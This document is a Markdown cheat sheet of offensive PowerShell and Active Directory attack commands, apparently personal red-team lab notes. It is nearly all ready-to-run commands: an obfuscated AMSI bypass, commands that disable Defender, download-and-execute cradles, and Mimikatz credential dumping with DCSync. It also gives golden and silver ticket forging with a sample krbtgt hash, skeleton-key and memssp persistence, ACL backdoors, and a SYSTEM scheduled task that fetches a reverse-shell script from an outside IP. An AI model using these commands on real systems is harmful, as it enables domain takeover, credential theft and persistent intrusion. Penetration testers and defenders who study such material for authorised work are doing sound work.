# Commands

# Powershell Basics

#### Help
```
Get-Help Get-Help
Get-Help *
Get-Help process
Get-Help Get-Item -Full
Get-Help Get-Item -Examples
```
#### Modules
```Import-Module modulepath```

```Get-Command -Module <modulename>```



#### Filter property string search

```Get-ADUser -Filter * | Where-Object {$_.Name -like '*smith*'}```
  
```Get-Service | Where-Object {$_.DisplayName -like '*Windows*'}```



```Get-Process | Select-Object -Property * | Where-Object { $_.psobject.Properties.Value -like '*chrome*' }```

```Get-Process | Select-Object -Property * | Where-Object { $_.* -like '*chrome*' }```

```Get-ANYTHING  | Select-Object -Property * | Where-Object { $_.* -like '*admin*' }```

# Running Powershell
#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```



#### EP Bypass
Start PowerShell from cmd.exe:

```Powershell- c <cmd>```

```powershell.exe -ep bypass```

OR If already running-

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass```

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted```

```$Env:PSExecutionPolicyPreference = 'Bypass'```

#### MS Bypass
```Set-MpPreference -DisableIOAVProtection $true```
```Set-MpPreference -DisableRealtimeMonitoring $true```
#### Kerberos Tickets
```klist```

# Tool Download

#### Execution Cradle
```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')```

#### Download Files
```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```

# Active Directory Enumeration
#### Bloodhound

SharpHound Collectors - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/
```
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.lab -OutputDirectory C:\Temp -ZipFileName loot123.zip
```

#### Powerview
```. .\PowerView.ps1```

Readme - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

#### AD Module
Import AD Module without RSAT: 
```iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory```
* * *
```
$ADClass=[System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

[AD Enumeration Scripts](https://github.com/conma293/ActiveDirectory)
* * * 
#### Machines

```Get-DomainComputer```
```Get-DomainComputer –OperatingSystem "*Server 2016*" ```
```Get-DomainComputer -Ping```
```Get-DomainComputer -FullData```

```Get-ADComputer -Filter * | select Name```

```Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' - Properties OperatingSystem | select Name,OperatingSystem```

```Get-ADComputer -Filter * -Properties *```

```Get-ADComputer -Filter *  -Properties DNSHostName | %{Test- Connection -Count 1 -ComputerName $_.DNSHostName}```

#### User Search
```Get-DomainUser```
```Get-DomainUser –Identity bob```

```Get-ADUser -Filter * -Properties *```
```Get-ADUser -Identity bob -Properties *```

#### Group Membership
```Get-DomainGroupMember -Identity "Domain Admin*" -Recurse```

```Get-DomainGroupMember -Identity "Domain Admin*" | select GroupName, MemberName```

```Get-ADGroupMember -Identity "Domain Admins" -Recursive```


```Get-DomainGroup –UserName "bob"```


#### Shares, GPOs, etc


```Invoke-ShareFinder –Verbose```

```Invoke-FileFinder –Verbose```

```Get-NetFileServer```

* * *
#### Users and Groups of Machines
```Get-NetLocalGroup -ComputerName <hostname>``` List all the local groups on a machine (needs admin privs on non-
dc machines)

```Get-NetLocalGroupMember -ComputerName <hostname>``` Get members of all the local groups on a machine (needs admin privs on non-dc machines)


```Get-NetLoggedon –ComputerName <hostname>``` (needs localadmin)

```Get-LoggedonLocal -ComputerName <hostname>``` (needs localadmin)
#### User Hunting

```Run Find-LocalAdminAccess``` - find all machines on current domain where current user has localadmin access

```Run Find-LocalAdminAccess -CheckAccess``` - list sessions where you have access to the machine

```Invoke-UserHunter``` for users/groups you want - will show all active sessions for users/users of specified groups

```Invoke-UserHunter -GroupName "RDPUsers"```

* * *

# Priv Esc

Run PowerUp - are you already localadmin?
```
. ./PowerUp.ps1
Invoke-AllChecks 
```


```Get-UnquotedService```

```Get-ModifiableService```

```Get-ModifiableServiceFile | select servicename, abusefeature```

# Lateral Movement
#### PowerShell Remoting
```Find-LocalAdminAccess -CheckAccess```

```Enter-PSSession –Computername Server1```

```$Sess = New-PSSession –Computername Server1```

```Invoke-Command –Session $Sess –ScriptBlock {whoami;host name;ipconfig}```

```Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get- Process}```

```Invoke-Command –Session $Sess –ScriptBlock {$Proc.name}```

```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess ```

If functions not on remote host:-

```. ./Invoke-Mimikatz.ps1```
```Invoke-Command –Session $Sess -ScriptBlock ${function:Invoke-Mimikatz}```

##### Copy Across
```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
``` ls //Server1.local/c$/temp```

# Mimikatz - Tickets

NTLM == RC4
#### DCSync
Does NOT need localadmin to run, just DC Replication privs:
```
lsadump::dcsync /user:Administrator
```

Golden - 
```
lsadump::dcsync /user:ecorp\krbtgt
```
#### Golden
Jump to DC to dump krbtgt hash or via DCSync above -

```psexec.exe \\dc01 cmd.exe```

```Privilege::debug```

```lsadump::lsa /patch```

**Note:** The top "Administrator" account dumped by Mimikatz with this command is actually the DSRM of the DC

Now back on attacker machine you use the NTLM of krbtgt account to create Golden Tickets:-

```
kerberos::golden 
/user:DonaldDuck /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

#### Silver
SPNs - https://adsecurity.org/?page_id=183
```
kerberos::golden 
/domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /target:dc01.ecorp.local /service:HOST 
/rc4:731a061e57100b658bc59d71f5176e93 /user:Administrator /ptt
```

With HOST Service access you can now create a scheduled task on the target machine:-

```
schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Updater123" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.3.111:8080/Invoke-PowerShellTcp.ps1'')'"
```

```
schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
```


# Invoke Mimikatz
```. ./Invoke-Mimikatz.ps1```

```Invoke-Mimikatz -ComputerName DC01```

```Invoke-Mimikatz -ComputerName DC01 -DumpCreds```

When invoking command make sure to wrap in double AND single quotes - 

```Invoke-Mimikatz -ComputerName DC01 -Command "kerberos::list"```

```Invoke-Mimikatz -Command '"lsadump::dcsync /user:Bob"'```

``` 
Invoke-Mimikatz -Command '"kerberos::golden 
/user:MickeyMouse /domain:ecorp.local /sid:S-1-5-21-1874506631-3219642033-
538555522 /krbtgt:731a061e57100b658bc59d71f5176e93
/id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
# Mimikatz - Misc Attacks

#### Skeleton Key Attack:-

```Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.ecorp.local```

May require Kernel Driverload onto the host if process protected:-

```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
```
 #### MemSSP
 MemSSP logs local logons, service account and machine account passwords in clear text on the target server:-
 
```Invoke-Mimikatz -Command '"misc::memssp"'``` - Logs local logons to C:\Windows\system32\kiwissp.log

* * *

#### Patch script if VirtualAlloc Error
Patched script working available here - [Tool dump](https://github.com/conma293/mvp) 

https://github.com/mitre/caldera/issues/38#issuecomment-396055260

https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invoke-mimikatz-ps1/

# Rights Abuse - ACLs
#### AdminSDHolder 

•  Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 

```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Josh -Rights All -Verbose``` - PowerView

```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Josh -Verbose``` - AD Module

#### Domain Replication Privileges 
•  Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) - https://adsecurity.org/?p=1729) for an arbitrary user 

```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' - PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView

```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module

#### Check ACLs
NOT WORKING!!
```Get-ObjectAcl -SamAccountName "Domain Admins" - ResolveGUIDs | ?{$_.IdentityReference -match 'Josh'}```
DCSync (not working): 
```Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ?{ ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }```

```Get-ObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}```
